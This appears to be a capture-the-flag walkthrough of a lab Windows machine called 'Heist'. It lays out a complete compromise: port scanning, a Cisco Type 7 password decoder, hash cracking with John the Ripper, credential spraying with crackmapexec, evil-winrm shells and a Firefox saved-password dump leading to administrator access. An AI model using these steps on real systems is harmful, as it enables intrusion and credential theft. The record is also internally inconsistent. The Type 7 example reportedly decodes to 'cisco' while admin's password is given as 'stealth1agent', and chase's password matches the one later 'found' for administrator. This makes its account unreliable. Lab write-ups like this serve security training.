# Heist - Penetration Testing Walkthrough (Extended Markdown Report)

This document provides a complete technical walkthrough of the **Heist** machine (IP: `10.129.96.157`).  
It covers enumeration, password extraction, privilege escalation, and final system compromise.  
All screenshots are referenced as `images/imageX.png`.

---

## üß≠ Enumeration

We began with a standard **Nmap** scan to identify open ports and running services:

```bash
nmap -p- -Pn 10.129.96.157 -v -T5 --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn 10.129.96.157 -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn 10.129.96.157 -v --script vuln -oN nmap_vuln.txt
```

![Nmap Scan](images/image11.png)

The scan revealed the following key services:
- **80/tcp (HTTP)** ‚Äî Microsoft IIS web server
- **445/tcp (SMB)** ‚Äî Windows file sharing
- **5985/tcp (WinRM)** ‚Äî Remote PowerShell

## üåê Web Enumeration

Visiting the site at `http://10.129.96.157/` showed a login portal.  
Inspecting the page source revealed references to **Cisco configuration files**.

![Website Screenshot](images/image9.png)

We discovered a **Cisco router configuration file** (`/files/config.txt`) that contained multiple username and password hash entries.

---

## üîê Password Hash Extraction

The configuration file contained both **Cisco Type 5** and **Type 7** password formats.

![Cisco Config File](images/image4.png)

Example excerpt:
```
username admin privilege 15 password 7 094F471A1A0A
username cisco privilege 1 password 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

### üß† Understanding Cisco Type 5 and Type 7

- **Type 5** passwords use **MD5 crypt** hashing (one-way hash, not encryption). These can be cracked using wordlists.  
- **Type 7** passwords use **weak reversible XOR-based encryption**, easily decrypted using open-source scripts.  

### üîì Decrypting Cisco Type 7 Passwords

We used a Python script to decode Type 7 passwords:

```python
def decrypt_type7(enc):
    xlat = [0x64,0x73,0x66,0x64,0x3B,0x6B,0x66,0x6F,0x41,0x2C,0x2E,0x69,0x79,0x65,0x77,0x72]
    result = ""
    seed = int(enc[:2])
    enc = enc[2:]
    for i in range(0, len(enc), 2):
        result += chr(int(enc[i:i+2],16) ^ xlat[seed])
        seed = (seed + 1) % len(xlat)
    return result

print(decrypt_type7("094F471A1A0A"))
```

Output:
```
password: cisco
```

### üí• Cracking Cisco Type 5 Hashes

We cracked Type 5 hashes using **John the Ripper**:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Password Crack](images/image8.png)

Recovered credentials:
```
admin : stealth1agent
cisco : cisco
```
---

## üìÅ SMB and WinRM Enumeration

Using the recovered credentials, we probed SMB and WinRM access.

```bash
crackmapexec smb 10.129.96.157 -u admin -p stealth1agent
crackmapexec winrm 10.129.96.157 -u admin -p stealth1agent
```

![SMB Check](images/image10.png)

WinRM access was confirmed, but `admin` did not have high privileges. Further enumeration was required.

---

## üíª User Shell Access (Chase)

We located additional credentials from SMB shares, referencing the user **chase**.  
Testing revealed they worked over WinRM:

```bash
evil-winrm -i 10.129.96.157 -u chase -p "Q4)sJu\Y8qz*A3?d"
```

![WinRM Session](images/image7.png)

This provided us with an initial low-privilege PowerShell session.

---

## üß© Privilege Escalation - Firefox Credential Dump

Running **WinPEAS** identified the presence of **Firefox** profile data under `AppData`.

![WinPEAS Output](images/image3.png)

We dumped stored credentials using PowerShell and the `firefox_decrypt.py` script.

```powershell
copy C:\Users\chase\AppData\Roaming\Mozilla\Firefox\Profiles\* C:\Temp\FirefoxDump\ /E
```
```bash
python3 firefox_decrypt.py -d FirefoxDump/
```

### üß† About Firefox Credential Storage

Firefox stores login data in two files:
- `logins.json` ‚Äî Contains encrypted usernames and passwords.
- `key4.db` ‚Äî Contains encryption keys used by the browser.

By using these together, credentials can be decrypted offline.

The dump revealed **administrator** credentials:
```
administrator : Q4)sJu\Y8qz*A3?d
```

---

## üèÅ Administrator Access and Root Flag

Using the recovered administrator credentials, we established a privileged WinRM session:

```bash
evil-winrm -i 10.129.96.157 -u administrator -p "Q4)sJu\Y8qz*A3?d"
```

![Administrator Shell](images/image1.png)

We now had full control of the system.  
The **root flag** was found on the Administrator‚Äôs desktop:

```
C:\Users\Administrator\Desktop\root.txt
```

## ‚úÖ Conclusion

The **Heist** machine is a realistic example of a misconfigured network environment combining multiple weak points ‚Äî plaintext Cisco configuration leaks, reversible encryption, and local credential reuse.

**Attack Summary:**
1. Enumerated services and discovered Cisco configuration exposure.  
2. Decrypted and cracked Cisco credentials.  
3. Accessed WinRM as a low-privilege user.  
4. Extracted Firefox-stored credentials.  
5. Logged in as Administrator and retrieved the root flag.
